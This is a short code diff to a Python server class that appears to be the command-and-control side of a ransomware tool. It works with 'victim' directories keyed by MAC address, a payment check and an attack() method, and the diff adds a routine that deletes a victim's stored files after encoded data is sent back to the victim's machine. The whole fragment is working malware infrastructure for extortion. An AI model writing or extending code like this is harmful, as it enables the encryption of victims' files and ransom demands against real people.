@@ -127,7 +127,11 @@ class Server:
         paid  =  amount_paid == 0
 
         return paid
-
+    
+    def remove_victim_files_from_server(self, mac):
+        path = os.path.join(Server.WORKING_DIR, mac)
+        shutil.rmtree(path)
+        print("all files in the victim directory has been removed")
 
     def attack(self):
         # Establish a connection with the client.
@@ -201,6 +205,9 @@ class Server:
                         self._socket.sendall(base64.b64encode(data.encode(Server.FORMAT)))
                         msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                         print("[CLIENT]: "+msg)
+                        
+                        """ Deleting the victim file from server """
+                        self.remove_victim_files_from_server(victim_mac)
 
                         """ Closing the file. """
                         file.close()  
